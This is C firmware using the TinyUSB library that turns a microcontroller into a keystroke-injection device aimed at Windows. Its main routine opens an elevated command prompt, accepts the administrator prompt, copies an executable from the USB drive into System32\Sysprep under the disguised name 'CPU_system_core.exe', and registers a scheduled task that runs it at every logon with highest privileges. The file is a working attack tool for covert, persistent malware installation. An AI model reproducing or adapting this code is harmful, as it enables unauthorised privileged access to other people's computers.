/*
 * The MIT License (MIT)
 *
 * Copyright (c) 2019 Ha Thach (tinyusb.org)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "bsp/board_api.h"
#include "tusb.h"
#include "usb_descriptors.h"


//--------------------------------------------------------------------+
// ASCII TO HID
//--------------------------------------------------------------------+

// ---------- Modifiers ----------
#define MOD_CTRL  KEYBOARD_MODIFIER_LEFTCTRL
#define MOD_SHIFT KEYBOARD_MODIFIER_LEFTSHIFT
#define MOD_ALT   KEYBOARD_MODIFIER_LEFTALT
#define MOD_WIN   KEYBOARD_MODIFIER_LEFTGUI

// ---------- Special keys ----------
#define ASCII_ESC     	  (char) 0x1B 
#define ASCII_ARROW_UP    (char) 0x01
#define ASCII_ARROW_DOWN  (char) 0x02
#define ASCII_ARROW_LEFT  (char) 0x03
#define ASCII_ARROW_RIGHT (char) 0x04
#define ASCII_HOME        (char) 0x05
#define ASCII_END         (char) 0x06
#define ASCII_PAGE_UP     (char) 0x07
#define ASCII_PAGE_DOWN   (char) 0x08
#define ASCII_INSERT      (char) 0x09
#define ASCII_DELETE      (char) 0x7F

//------raw hid--------
//only use with type_char_raw/type_char_raw_with_mods
#define HID_KEY_F1    0x3A
#define HID_KEY_F2    0x3B
#define HID_KEY_F3    0x3C
#define HID_KEY_F4    0x3D
#define HID_KEY_F5    0x3E


// ---------- ASCII → HID mapping ----------

static const uint8_t hid_ascii_usage[128] = {
    // letters
    ['a'] = HID_KEY_A, ['A'] = HID_KEY_A,
    ['b'] = HID_KEY_B, ['B'] = HID_KEY_B,
    ['c'] = HID_KEY_C, ['C'] = HID_KEY_C,
    ['d'] = HID_KEY_D, ['D'] = HID_KEY_D,
    ['e'] = HID_KEY_E, ['E'] = HID_KEY_E,
    ['f'] = HID_KEY_F, ['F'] = HID_KEY_F,
    ['g'] = HID_KEY_G, ['G'] = HID_KEY_G,
    ['h'] = HID_KEY_H, ['H'] = HID_KEY_H,
    ['i'] = HID_KEY_I, ['I'] = HID_KEY_I,
    ['j'] = HID_KEY_J, ['J'] = HID_KEY_J,
    ['k'] = HID_KEY_K, ['K'] = HID_KEY_K,
    ['l'] = HID_KEY_L, ['L'] = HID_KEY_L,
    ['m'] = HID_KEY_M, ['M'] = HID_KEY_M,
    ['n'] = HID_KEY_N, ['N'] = HID_KEY_N,
    ['o'] = HID_KEY_O, ['O'] = HID_KEY_O,
    ['p'] = HID_KEY_P, ['P'] = HID_KEY_P,
    ['q'] = HID_KEY_Q, ['Q'] = HID_KEY_Q,
    ['r'] = HID_KEY_R, ['R'] = HID_KEY_R,
    ['s'] = HID_KEY_S, ['S'] = HID_KEY_S,
    ['t'] = HID_KEY_T, ['T'] = HID_KEY_T,
    ['u'] = HID_KEY_U, ['U'] = HID_KEY_U,
    ['v'] = HID_KEY_V, ['V'] = HID_KEY_V,
    ['w'] = HID_KEY_W, ['W'] = HID_KEY_W,
    ['x'] = HID_KEY_X, ['X'] = HID_KEY_X,
    ['y'] = HID_KEY_Y, ['Y'] = HID_KEY_Y,
    ['z'] = HID_KEY_Z, ['Z'] = HID_KEY_Z,

    // numbers & shifted symbols
    ['1'] = HID_KEY_1, ['!'] = HID_KEY_1,
    ['2'] = HID_KEY_2, ['@'] = HID_KEY_2,
    ['3'] = HID_KEY_3, ['#'] = HID_KEY_3,
    ['4'] = HID_KEY_4, ['$'] = HID_KEY_4,
    ['5'] = HID_KEY_5, ['%'] = HID_KEY_5,
    ['6'] = HID_KEY_6, ['^'] = HID_KEY_6,
    ['7'] = HID_KEY_7, ['&'] = HID_KEY_7,
    ['8'] = HID_KEY_8, ['*'] = HID_KEY_8,
    ['9'] = HID_KEY_9, ['('] = HID_KEY_9,
    ['0'] = HID_KEY_0, [')'] = HID_KEY_0,

    // whitespace
    [' ']  = HID_KEY_SPACE,
    ['\n'] = HID_KEY_ENTER,
    ['\r'] = HID_KEY_ENTER,
    ['\t'] = HID_KEY_TAB,

    // punctuation
    ['-'] = HID_KEY_MINUS, ['_'] = HID_KEY_MINUS,
    ['='] = HID_KEY_EQUAL, ['+'] = HID_KEY_EQUAL,

    ['['] = HID_KEY_BRACKET_LEFT,  ['{'] = HID_KEY_BRACKET_LEFT,
    [']'] = HID_KEY_BRACKET_RIGHT, ['}'] = HID_KEY_BRACKET_RIGHT,

    ['\\'] = HID_KEY_BACKSLASH, ['|'] = HID_KEY_BACKSLASH,

    [';'] = HID_KEY_SEMICOLON, [':'] = HID_KEY_SEMICOLON,

    ['\''] = HID_KEY_APOSTROPHE, ['"'] = HID_KEY_APOSTROPHE,

    ['`'] = HID_KEY_GRAVE, ['~'] = HID_KEY_GRAVE,

    [','] = HID_KEY_COMMA,  ['<'] = HID_KEY_COMMA,
    ['.'] = HID_KEY_PERIOD, ['>'] = HID_KEY_PERIOD,
    ['/'] = HID_KEY_SLASH,  ['?'] = HID_KEY_SLASH,

	[0x1B] = HID_KEY_ESCAPE, 

	[0x01] = HID_KEY_ARROW_UP,
	[0x02] = HID_KEY_ARROW_DOWN,
	[0x03] = HID_KEY_ARROW_LEFT,
	[0x04] = HID_KEY_ARROW_RIGHT,

	[0x05] = HID_KEY_HOME,
	[0x06] = HID_KEY_END,
	[0x07] = HID_KEY_PAGE_UP,
	[0x08] = HID_KEY_PAGE_DOWN,

	[0x09] = HID_KEY_INSERT,
	[0x7F] = HID_KEY_DELETE,
};

static const uint8_t hid_ascii_shift[128] = {
    // uppercase
    ['A'] = MOD_SHIFT, ['B'] = MOD_SHIFT, ['C'] = MOD_SHIFT, ['D'] = MOD_SHIFT,
    ['E'] = MOD_SHIFT, ['F'] = MOD_SHIFT, ['G'] = MOD_SHIFT, ['H'] = MOD_SHIFT,
    ['I'] = MOD_SHIFT, ['J'] = MOD_SHIFT, ['K'] = MOD_SHIFT, ['L'] = MOD_SHIFT,
    ['M'] = MOD_SHIFT, ['N'] = MOD_SHIFT, ['O'] = MOD_SHIFT, ['P'] = MOD_SHIFT,
    ['Q'] = MOD_SHIFT, ['R'] = MOD_SHIFT, ['S'] = MOD_SHIFT, ['T'] = MOD_SHIFT,
    ['U'] = MOD_SHIFT, ['V'] = MOD_SHIFT, ['W'] = MOD_SHIFT, ['X'] = MOD_SHIFT,
    ['Y'] = MOD_SHIFT, ['Z'] = MOD_SHIFT,

    // shifted symbols
    ['!'] = MOD_SHIFT, ['@'] = MOD_SHIFT, ['#'] = MOD_SHIFT,
    ['$'] = MOD_SHIFT, ['%'] = MOD_SHIFT, ['^'] = MOD_SHIFT,
    ['&'] = MOD_SHIFT, ['*'] = MOD_SHIFT, ['('] = MOD_SHIFT,
    [')'] = MOD_SHIFT, ['_'] = MOD_SHIFT, ['+'] = MOD_SHIFT,
    ['{'] = MOD_SHIFT, ['}'] = MOD_SHIFT, ['|'] = MOD_SHIFT,
    [':'] = MOD_SHIFT, ['"'] = MOD_SHIFT, ['~'] = MOD_SHIFT,
    ['<'] = MOD_SHIFT, ['>'] = MOD_SHIFT, ['?'] = MOD_SHIFT,

    [0x1B] = 0,
    [0x01] = 0,
    [0x02] = 0,
    [0x03] = 0,
    [0x04] = 0,
    [0x05] = 0,
    [0x06] = 0,
    [0x07] = 0,
    [0x08] = 0,
    [0x09] = 0,
    [0x7F] = 0,
};




// Typing speed, lower the more buggy
#define WAIT_STRING 1
#define KEY_RELEASE 3

#define WAIT_PROGRAMS_FAST 50
#define WAIT_PROGRAMS_SLOW 500

// path to download app
#define WINDOWS_FILEPATH "C:\\Windows\\System32\\Sysprep\\"

// path to copy app from your usb
#define USB_FILEPATH "D:\\exe\\"

// app name
#define APP_NAME "CPU_system_core.exe"


// ---------- Typing helpers ----------

void type_char_raw(uint8_t c);
void type_char_raw_with_mods(uint8_t c, uint8_t mods);

bool type_char(char c);
bool type_char_with_mods(char c, uint8_t mods);
static inline void type_string(const char *s);
static inline void type_string_with_mods(const char *s, uint8_t extra_mods);


// ---------- Commonly used ----------

static inline void enter(void) {
    type_char('\n');
}

static inline void close(void) {
    type_char_raw_with_mods(HID_KEY_F4, MOD_ALT);
}

/*------------- MAIN -------------*/

void initialiser(void) {
	board_init();
	// init device stack on configured roothub port
	tud_init(BOARD_TUD_RHPORT);

	while (!tud_mounted()) {
		tud_task();
		sleep_ms(10);
	}
	sleep_ms(2000);

	if (board_init_after_tusb) {
		board_init_after_tusb();
	}

	while (!board_button_read()) {
		sleep_ms(50);
	}
	type_char(ASCII_ESC);
	sleep_ms(50);
}


int main(void)
{
	initialiser();

	type_char_with_mods('r', MOD_WIN);
	sleep_ms(WAIT_PROGRAMS_FAST);
	
	type_string("cmd");
	sleep_ms(WAIT_PROGRAMS_FAST);

	type_char_with_mods('\n', MOD_CTRL | MOD_SHIFT);
	sleep_ms(WAIT_PROGRAMS_SLOW);

	type_char(ASCII_ARROW_LEFT);
	sleep_ms(WAIT_PROGRAMS_FAST);
	enter();
  sleep_ms(WAIT_PROGRAMS_SLOW);

  type_string("copy ");
  type_string(USB_FILEPATH);
  type_string(APP_NAME);
  type_char(' ');
  type_string(WINDOWS_FILEPATH);
  enter();
  sleep_ms(WAIT_PROGRAMS_FAST);

  type_string("schtasks /create /sc onlogon /tn \"");
  type_string(APP_NAME);
  type_string("\" /tr \"");
  type_string(WINDOWS_FILEPATH);
  type_string(APP_NAME);
  type_string("\" /rl highest /f");
  enter();
  sleep_ms(WAIT_PROGRAMS_FAST);
  close();

}


//--------------------------------------------------------------------+
// USB HID
//--------------------------------------------------------------------+

static inline bool send_hid_report(uint8_t report_id, char c, uint8_t modifiers)
{
  uint8_t const ch = (uint8_t)c;

  if (!tud_hid_ready()) return false;

  uint8_t keycode[6] = { 0 };
  keycode[0] = hid_ascii_usage[ch];

  uint8_t mods = modifiers | hid_ascii_shift[ch];

	return tud_hid_keyboard_report(REPORT_ID_KEYBOARD, mods, keycode);
}

void type_char_raw(uint8_t c)
{
  uint8_t const ch = (uint8_t)c;

  while (!tud_hid_ready()) {
      tud_task();
      sleep_ms(1);
  }
  uint8_t keycode[6] = { 0 };
  keycode[0] = c;

	tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, keycode);

  sleep_ms(KEY_RELEASE);

  // Wait until ready again for release
  while (!tud_hid_ready()) {
      tud_task();
      sleep_ms(1);
  }

  // RELEASE
  tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
  sleep_ms(KEY_RELEASE);

  return;
}

void type_char_raw_with_mods(uint8_t c, uint8_t mods)
{
  uint8_t const ch = (uint8_t)c;

  while (!tud_hid_ready()) {
      tud_task();
      sleep_ms(1);
  }
  uint8_t keycode[6] = { 0 };
  keycode[0] = c;

	while (!tud_hid_keyboard_report(REPORT_ID_KEYBOARD, mods, keycode)){}

  sleep_ms(KEY_RELEASE);

  // Wait until ready again for release
  while (!tud_hid_ready()) {
      tud_task();
      sleep_ms(1);
  }

  // RELEASE
  tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
  sleep_ms(KEY_RELEASE);

  return;
}

bool type_char(char c)
{
    if (tud_suspended()) {
        tud_remote_wakeup();
        return false;
    }

    // Wait until HID is ready
    while (!tud_hid_ready()) {
        tud_task();
        sleep_ms(1);
    }

    // PRESS
    send_hid_report(REPORT_ID_KEYBOARD, c, 0);
    sleep_ms(KEY_RELEASE);

    // Wait until ready again for release
    while (!tud_hid_ready()) {
        tud_task();
        sleep_ms(1);
    }

    // RELEASE
    tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
    sleep_ms(KEY_RELEASE);

    return true;
}

bool type_char_with_mods(char c, uint8_t mods)
{
    if (tud_suspended()) {
        tud_remote_wakeup();
        return false;
    }

    // Wait until HID is ready
    while (!tud_hid_ready()) {
        tud_task();
        sleep_ms(1);
    }

    // PRESS
    send_hid_report(REPORT_ID_KEYBOARD, c, mods);
    sleep_ms(KEY_RELEASE);

    // Wait until ready again for release
    while (!tud_hid_ready()) {
        tud_task();
        sleep_ms(1);
    }

    // RELEASE
    tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
    sleep_ms(KEY_RELEASE);

    return true;
}


static inline void type_string(const char *s) {
    while (*s) {
		tud_task(); // tinyusb device task
  		sleep_ms(WAIT_STRING);
      	if (type_char(*s)) s++;
    }
}

static inline void type_string_with_mods(const char *s, uint8_t extra_mods) {
    while (*s) {
		tud_task(); // tinyusb device task
  		sleep_ms(WAIT_STRING);
      	if (type_char_with_mods(*s, extra_mods)) s++;
    }
}















//--------------------------------------------------------------------+
// Need to be defined, dont seem to be useful/needed idk
//--------------------------------------------------------------------+

// Invoked when device is mounted
void tud_mount_cb(void)
{
  return;
}

// Invoked when device is unmounted
void tud_umount_cb(void)
{
  return;
}

// Invoked when usb bus is suspended
// remote_wakeup_en : if host allow us  to perform remote wakeup
// Within 7ms, device must draw an average of current less than 2.5 mA from bus
void tud_suspend_cb(bool remote_wakeup_en)
{
  return;
}

// Invoked when usb bus is resumed
void tud_resume_cb(void)
{
  return;
}

// Invoked when received GET_REPORT control request
// Application must fill buffer report's content and return its length.
// Return zero will cause the stack to STALL request
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen)
{
  // TODO not Implemented
  (void) instance;
  (void) report_id;
  (void) report_type;
  (void) buffer;
  (void) reqlen;

  return 0;
}

// Invoked when received SET_REPORT control request or
// received data on OUT endpoint ( Report ID = 0, Type = 0 )
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize)
{
  return;
}


